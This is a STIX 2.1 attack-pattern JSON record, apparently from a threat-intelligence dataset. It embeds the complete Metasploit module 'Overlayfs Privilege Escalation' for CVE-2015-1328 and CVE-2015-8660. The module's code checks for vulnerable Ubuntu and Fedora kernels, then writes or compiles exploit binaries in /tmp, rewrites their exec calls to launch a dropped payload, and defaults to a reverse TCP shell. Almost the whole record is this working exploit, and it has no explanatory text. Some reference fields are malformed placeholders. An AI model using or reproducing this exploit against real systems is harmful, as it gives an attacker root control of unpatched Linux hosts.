{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c484fdb5-c95a-429d-832a-c70eea00356f",
    "created": "2024-08-14T16:58:40.014982Z",
    "modified": "2024-08-14T16:58:40.014986Z",
    "name": "Overlayfs Privilege Escalation",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/overlayfs_priv_esc.rb",
            "external_id": "overlayfs_priv_esc.rb"
        },
        {
            "source_name": "CVE-2015-1328",
            "external_id": "{}"
        },
        {
            "source_name": "CVE-2015-8660",
            "external_id": "{}"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1328"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-8660"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n        'Name'           => 'Overlayfs Privilege Escalation',\n        'Description'    => %q{\n          This module attempts to exploit two different CVEs related to overlayfs.\n          CVE-2015-1328: Ubuntu specific -> 3.13.0-24 (14.04 default) < 3.13.0-55\n                                            3.16.0-25 (14.10 default) < 3.16.0-41\n                                            3.19.0-18 (15.04 default) < 3.19.0-21\n          CVE-2015-8660:\n              Ubuntu:\n                     3.19.0-18 < 3.19.0-43\n                     4.2.0-18 < 4.2.0-23 (14.04.1, 15.10)\n              Fedora:\n                     < 4.2.8 (vulnerable, un-tested)\n              Red Hat:\n                     < 3.10.0-327 (rhel 6, vulnerable, un-tested)\n        },\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'h00die <mike@shorebreaksecurity.com>',  # Module\n            'rebel'                         # Discovery\n          ],\n        'DisclosureDate' => '2015-06-16',\n        'Platform'       => [ 'linux'],\n        'Arch'           => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\n        'Targets'        =>\n          [\n            [ 'CVE-2015-1328', { } ],\n            [ 'CVE-2015-8660', { } ]\n          ],\n        'DefaultTarget'  => 1,\n        'DefaultOptions' =>\n          {\n            'payload' => 'linux/x86/shell/reverse_tcp' # for compatibility due to the need on cve-2015-1328 to run /bin/su\n          },\n        'References'     =>\n          [\n            [ 'EDB', '39166'], # CVE-2015-8660\n            [ 'EDB', '37292'], # CVE-2015-1328\n            [ 'CVE', '2015-1328'],\n            [ 'CVE', '2015-8660']\n          ]\n      ))\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ])\n    ]\n  end\n\n  def check\n    def mounts_exist?()\n      vprint_status('Checking if mount points exist')\n      if target.name == 'CVE-2015-1328'\n        if not directory?('/tmp/ns_sploit')\n          vprint_good('/tmp/ns_sploit not created')\n          return true\n        else\n          print_error('/tmp/ns_sploit directory exists.  Please delete.')\n          return false\n        end\n      elsif target.name == 'CVE-2015-8660'\n        if not directory?('/tmp/haxhax')\n          vprint_good('/tmp/haxhax not created')\n          return true\n        else\n          print_error('/tmp/haxhax directory exists.  Please delete.')\n          return false\n        end\n      end\n    end\n\n    def kernel_vuln?()\n      os_id = cmd_exec('grep ^ID= /etc/os-release')\n      case os_id\n      when 'ID=ubuntu'\n        kernel = Rex::Version.new(cmd_exec('/bin/uname -r'))\n        case kernel.release.to_s\n        when '3.13.0'\n          if kernel.between?(Rex::Version.new('3.13.0-24-generic'),Rex::Version.new('3.13.0-54-generic'))\n            vprint_good(\"Kernel #{kernel} is vulnerable to CVE-2015-1328\")\n            return true\n          else\n            print_error(\"Kernel #{kernel} is NOT vulnerable\")\n            return false\n          end\n        when '3.16.0'\n          if kernel.between?(Rex::Version.new('3.16.0-25-generic'),Rex::Version.new('3.16.0-40-generic'))\n            vprint_good(\"Kernel #{kernel} is vulnerable to CVE-2015-1328\")\n            return true\n          else\n            print_error(\"Kernel #{kernel} is NOT vulnerable\")\n            return false\n          end\n        when '3.19.0'\n          if kernel.between?(Rex::Version.new('3.19.0-18-generic'),Rex::Version.new('3.19.0-20-generic'))\n            vprint_good(\"Kernel #{kernel} is vulnerable to CVE-2015-1328\")\n            return true\n          elsif kernel.between?(Rex::Version.new('3.19.0-18-generic'),Rex::Version.new('3.19.0-42-generic'))\n            vprint_good(\"Kernel #{kernel} is vulnerable to CVE-2015-8660\")\n            return true\n          else\n            print_error(\"Kernel #{kernel} is NOT vulnerable\")\n            return false\n          end\n        when '4.2.0'\n          if kernel.between?(Rex::Version.new('4.2.0-18-generic'),Rex::Version.new('4.2.0-22-generic'))\n            vprint_good(\"Kernel #{kernel} is vulnerable to CVE-2015-8660\")\n            return true\n          else\n            print_error(\"Kernel #{kernel} is NOT vulnerable\")\n            return false\n          end\n        else\n          print_error(\"Non-vuln kernel #{kernel}\")\n          return false\n        end\n      when 'ID=fedora'\n        kernel = Rex::Version.new(cmd_exec('/usr/bin/uname -r').sub(/\\.fc.*/, '')) # we need to remove the trailer after .fc\n        # irb(main):008:0> '4.0.4-301.fc22.x86_64'.sub(/\\.fc.*/, '')\n        # => \"4.0.4-301\"\n        if kernel.release < Rex::Version.new('4.2.8')\n          vprint_good(\"Kernel #{kernel} is vulnerable to CVE-2015-8660.  Exploitation UNTESTED\")\n          return true\n        else\n          print_error(\"Non-vuln kernel #{kernel}\")\n          return false\n        end\n      else\n        print_error(\"Unknown OS: #{os_id}\")\n        return false\n      end\n    end\n\n    if mounts_exist?() && kernel_vuln?()\n      return CheckCode::Appears\n    else\n      return CheckCode::Safe\n    end\n  end\n\n  def exploit\n\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\n    end\n\n    filename = rand_text_alphanumeric(8)\n    executable_path = \"#{datastore['WritableDir']}/#{filename}\"\n    payloadname = rand_text_alphanumeric(8)\n    payload_path = \"#{datastore['WritableDir']}/#{payloadname}\"\n\n    def has_prereqs?()\n      gcc = cmd_exec('which gcc')\n      if gcc.include?('gcc')\n        vprint_good('gcc is installed')\n      else\n        print_error('gcc is not installed.  Compiling will fail.')\n      end\n      return gcc.include?('gcc')\n    end\n\n    compile = false\n    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'\n      if has_prereqs?()\n        compile = true\n        vprint_status('Live compiling exploit on system')\n      else\n        vprint_status('Dropping pre-compiled exploit on system')\n      end\n    end\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\n    end\n\n    def upload_and_chmod(fname, fcontent, cleanup=true)\n      print_status \"Writing to #{fname} (#{fcontent.size} bytes)\"\n      rm_f fname\n      write_file(fname, fcontent)\n      cmd_exec(\"chmod +x #{fname}\")\n      if cleanup\n        register_file_for_cleanup(fname)\n      end\n    end\n\n    def on_new_session(session)\n      super\n      if target.name == 'CVE-2015-1328'\n        session.shell_command(\"/bin/su\") #this doesnt work on meterpreter?????\n        # we cleanup here instead of earlier since we needed the /bin/su in our new session\n        session.shell_command('rm -f /etc/ld.so.preload')\n        session.shell_command('rm -f /tmp/ofs-lib.so')\n      end\n    end\n\n    if compile\n      begin\n        if target.name == 'CVE-2015-1328'\n          # direct copy of code from exploit-db.  There were a bunch of ducplicate header includes I removed, and a lot of the comment title area just to cut down on size\n          # Also removed the on-the-fly compilation of ofs-lib.c and we do that manually ahead of time, or drop the binary.\n          path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2015-1328', '1328.c')\n          fd = ::File.open( path, \"rb\")\n          cve_2015_1328 = fd.read(fd.stat.size)\n          fd.close\n\n          # pulled out from 1328.c's LIB define\n          path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2015-1328', 'ofs-lib.c')\n          fd = ::File.open( path, \"rb\")\n          ofs_lib = fd.read(fd.stat.size)\n          fd.close\n        else\n          # direct copy of code from exploit-db.  There were a bunch of ducplicate header includes I removed, and a lot of the comment title area just to cut down on size\n          path = ::File.join( Msf::Config.install_root, 'external', 'source', 'exploits', 'CVE-2015-8660', '8660.c')\n          fd = ::File.open( path, \"rb\")\n          cve_2015_8660 = fd.read(fd.stat.size)\n          fd.close\n        end\n      rescue\n        compile = false #hdm said external folder is optional and all module should run even if external is deleted.  If we fail to load, default to binaries\n      end\n    end\n\n\n    if compile\n      if target.name == 'CVE-2015-1328'\n        cve_2015_1328.gsub!(/execl\\(\"\\/bin\\/su\",\"su\",NULL\\);/,\n                            \"execl(\\\"#{payload_path}\\\",\\\"#{payloadname}\\\",NULL);\")\n        upload_and_chmod(\"#{executable_path}.c\", cve_2015_1328)\n        ofs_path = \"#{datastore['WritableDir']}/ofs-lib\"\n        upload_and_chmod(\"#{ofs_path}.c\", ofs_lib)\n        cmd_exec(\"gcc -fPIC -shared -o #{ofs_path}.so #{ofs_path}.c -ldl -w\") # compile dependency file\n        register_file_for_cleanup(\"#{ofs_path}.c\")\n      else\n        cve_2015_8660.gsub!(/os.execl\\('\\/bin\\/bash','bash'\\)/,\n                            \"os.execl('#{payload_path}','#{payloadname}')\")\n        upload_and_chmod(\"#{executable_path}.c\", cve_2015_8660)\n      end\n      vprint_status(\"Compiling #{executable_path}.c\")\n      cmd_exec(\"gcc -o #{executable_path} #{executable_path}.c\") # compile\n      register_file_for_cleanup(executable_path)\n    else\n      if target.name == 'CVE-2015-1328'\n        path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-1328', '1328')\n        fd = ::File.open( path, \"rb\")\n        cve_2015_1328 = fd.read(fd.stat.size)\n        fd.close\n        upload_and_chmod(executable_path, cve_2015_1328)\n\n        path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-1328', 'ofs-lib.so')\n        fd = ::File.open( path, \"rb\")\n        ofs_lib = fd.read(fd.stat.size)\n        fd.close\n        ofs_path = \"#{datastore['WritableDir']}/ofs-lib\"\n        # dont auto cleanup or else it happens too quickly and we never escalate ourprivs\n        upload_and_chmod(\"#{ofs_path}.so\", ofs_lib, false)\n\n        # overwrite with the hardcoded variable names in the compiled versions\n        payload_filename = 'lXqzVpYN'\n        payload_path = '/tmp/lXqzVpYN'\n      else\n        path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2015-8660', '8660')\n        fd = ::File.open( path, \"rb\")\n        cve_2015_8660 = fd.read(fd.stat.size)\n        fd.close\n        upload_and_chmod(executable_path, cve_2015_8660)\n        # overwrite with the hardcoded variable names in the compiled versions\n        payload_filename = '1H0qLaq2'\n        payload_path = '/tmp/1H0qLaq2'\n      end\n    end\n\n    upload_and_chmod(payload_path, generate_payload_exe)\n    vprint_status('Exploiting...')\n    output = cmd_exec(executable_path)\n    output.each_line { |line| vprint_status(line.chomp) }\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-06-16",
    "x_mitre_platforms": [
        "[ 'linux']"
    ]
}